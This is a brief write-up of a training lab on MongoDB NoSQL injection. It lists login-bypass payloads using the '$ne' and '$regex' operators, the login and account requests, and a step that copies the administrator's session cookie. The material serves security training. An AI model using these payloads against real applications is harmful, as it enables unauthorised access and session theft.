The login functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection using MongoDB operators.

To solve the lab, log into the application as the `administrator` user.

You can log in to your own account using the following credentials: `wiener:peter`.

---

Goal: Login to the admin account.

`{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`

username:
```php
{"$ne":"invalid"}
```

password:
```php
{"$ne":"invalid"}
```

```php
{"$ne":""}
```

```php
{"$regex":"admin.*"}
```

GET /my-account?id=admin5ou6hen8 

POST /login

Copy the cookie and update the browser with the new value. This allows me to steal the admin session and complete the lab.
